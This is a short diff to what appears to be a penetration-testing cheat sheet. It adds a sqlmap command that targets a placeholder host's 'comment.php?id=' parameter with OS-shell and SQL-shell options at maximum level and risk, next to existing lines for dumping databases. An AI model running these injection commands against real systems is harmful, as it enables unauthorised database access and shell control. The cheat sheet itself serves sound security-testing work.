@@ -30,6 +30,9 @@ sqlmap –u http://<targetip>/index.php?par= –dbs –D dbname –T tablename �
 # OS Shell
 sqlmap -u http://<targetip>/comment.php?id=738 --dbms=mysql --osshell
 
+# SQL Shell
+sqlmap -u http://<targetip>/comment.php?id=738 --dbms=mysql --osshell --sql-shell --level 5 --risk 3 
+
 --------------------------------
 
 Manual sql injection commands
